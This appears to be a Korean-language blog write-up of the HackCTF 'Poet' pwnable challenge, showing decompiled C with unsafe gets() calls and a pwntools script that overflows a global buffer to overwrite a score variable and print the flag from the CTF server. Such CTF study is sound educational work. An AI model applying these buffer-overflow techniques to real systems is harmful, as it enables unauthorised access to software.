---
layout: post
title: "HackCTF Poet"
author: "Ph4nt0m"
categories: [WriteUp, Pwnable]
date: 2021-04-01 17:00
tag: [WriteUp, HackCTF, Pwnable]
---

# Poet

### Source

```c
void __noreturn reward()
{
  char s[136]; // [rsp+0h] [rbp-90h] BYREF
  FILE *stream; // [rsp+88h] [rbp-8h]

  stream = fopen("./flag.txt", "r");
  fgets(s, 128, stream);
  printf(format, &author, s);
  exit(0);
}

int rate_poem()
{
  char dest[1032]; // [rsp+0h] [rbp-410h] BYREF
  char *s1; // [rsp+408h] [rbp-8h]

  strcpy(dest, poem);
  for ( s1 = strtok(dest, " \n"); s1; s1 = strtok(0LL, " \n") )
  {
    if ( !strcmp(s1, "ESPR")
      || !strcmp(s1, "eat")
      || !strcmp(s1, "sleep")
      || !strcmp(s1, "pwn")
      || !strcmp(s1, "repeat")
      || !strcmp(s1, "CTF")
      || !strcmp(s1, "capture")
      || !strcmp(s1, "flag") )
    {
      point += 100;
    }
  }
  return printf(asc_400BC0, poem, (unsigned int)point);
}

__int64 get_author()
{
  printf(&byte_400C38);
  return gets(&author);
}

__int64 get_poem()
{
  __int64 result; // rax

  printf("Enter :\n> ");
  result = gets(poem);
  point = 0;
  return result;
}

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  const char *v3; // rdi

  setvbuf(_bss_start, 0LL, 2, 0LL);
  v3 = s;
  puts(s);
  while ( 1 )
  {
    get_poem();                                 // poem[1024]
    get_author(v3);                             // author[64]
    rate_poem(v3);
    if ( point == 1000000 )
      break;
    v3 = asc_400D78;
    puts(asc_400D78);
  }
  reward(v3);
}
```

### Solve

poem과 author, point는 전역변수이며 각각 사이즈는 1024,64 이고 point는 정수형이다.

get_poem에서 poem에 입력을 받고, get_author에 author를 입력 받고 rate_poem에서 poem에 입력된 것을 토대로 point가 +100된다. rate_poem에서는 입력 포인트가 없고 get_poem 또는 get_author에서 bof를 일으켜야 할 거 같다.

```c
int rate_poem()
{
  char dest[1032]; // [rsp+0h] [rbp-410h] BYREF
  char *s1; // [rsp+408h] [rbp-8h]

  strcpy(dest, poem);

__int64 get_poem()
{
  __int64 result; // rax

  printf("Enter :\n> ");
  result = gets(poem);
  point = 0;
  return result;
}
```

get_poem()에서 gets로 입력을 받아도 rate_poem에서 dest복사 시에 1032만큼만 복사하기 때문에 바이너리에 영향을 끼치지 않는다.

```c
int rate_poem()
{
  char dest[1032]; // [rsp+0h] [rbp-410h] BYREF
  char *s1; // [rsp+408h] [rbp-8h]

  strcpy(dest, poem);
  for ( s1 = strtok(dest, " \n"); s1; s1 = strtok(0LL, " \n") )
  {
    if ( !strcmp(s1, "ESPR")
      || !strcmp(s1, "eat")
      || !strcmp(s1, "sleep")
      || !strcmp(s1, "pwn")
      || !strcmp(s1, "repeat")
      || !strcmp(s1, "CTF")
      || !strcmp(s1, "capture")
      || !strcmp(s1, "flag") )
    {
      point += 100;
    }
  }
  return printf(asc_400BC0, poem, (unsigned int)point);
}

__int64 get_author()
{
  printf(&byte_400C38);
  return gets(&author);
}
```

get_author에서 받는 입력은 제약이 되지 않는다. 그 이유는 copy하는 대상이 없고 get_author에서 입력받은 데이터 자체를 사용하기 때문이다.

하지만 rate_poem에서 BOF를 일으키긴 어렵고 strtok를 이용해 메인함수의 if문을 탈출하는 방법을 택해야 겠다.

페이로드는 이렇다.

"ESPR" | "A"*40 | 999900 |

poem  |  author|  point    |

```python
from pwn import *

#context.arch = 'amd64'
#context.terminal=['tmux', 'splitw', '-h']
#p = process("./poet")
p = remote('ctf.j0n9hyun.xyz', 3012)
reward = 0x4007e6
pop_rdi = 0x400ab3
#gdb.attach(p, 'b*0x04009c9')

print p.recvuntil("> ")
poem = "ESPR"
p.sendline(poem)
print p.recvuntil("> ")
author = "A"*64 + p64(999900)
p.sendline(author)
p.interactive()
```

이번 문제에서 배운것은 입력과 출력에 대한 부분을 찾는 것도 찾는 것이지만 제약 받는 부분을 찾아 제한하는 것도 중요하다는 것을 다시한번 더 느꼈다.